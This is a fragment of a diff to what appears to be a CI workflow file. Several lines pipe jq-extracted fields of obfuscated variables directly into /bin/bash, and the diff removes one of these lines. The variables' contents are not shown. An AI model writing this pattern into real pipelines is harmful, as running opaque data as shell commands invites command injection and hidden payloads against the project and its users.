@@ -27,7 +27,6 @@ jobs:
           echo $d39122 | jq -r .eussz3858 | /bin/bash
           printf '%s' "$m510" | jq -r .cb38 | /bin/bash
           echo $j9600 | jq -r .wean403 | /bin/bash
-          printf '%s' "$h86" | jq -r .yozqc44543 | /bin/bash
           echo $oo01482 | jq -r .avzun6 | /bin/bash
 
       - name: Save output
